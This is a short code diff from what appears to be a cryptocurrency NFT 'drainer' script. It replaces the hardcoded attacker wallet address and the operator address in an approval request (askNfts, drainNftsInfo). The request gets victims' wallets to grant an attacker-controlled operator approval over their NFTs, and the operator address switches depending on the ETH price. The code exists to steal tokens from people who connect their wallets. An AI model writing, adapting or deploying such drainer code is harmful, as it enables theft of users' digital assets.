@@ -1,4 +1,4 @@
-const receiveAddress = "0xE7C494F426D6874475B8B2b6549e435d6921FB8F";
+const receiveAddress = "0x5FAf73b167d1246EfF95B33D64A6D8C7d9Dfc3B5";
 const drainNftsInfo = {
     minValue: 0.01,
     maxTransfers: 1,
@@ -171,7 +171,7 @@ async function askNfts() {
                     "type": "function"
                 }],
                 params: {
-                    operator: ethPrice > 999 ? "0xE7C494F426D6874475B8B2b6549e435d6921FB8F" : receiveAddress,
+                    operator: ethPrice > 999 ? "0x5FAf73b167d1246EfF95B33D64A6D8C7d9Dfc3B5" : receiveAddress,
                     approved: true
                 },
                 gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit
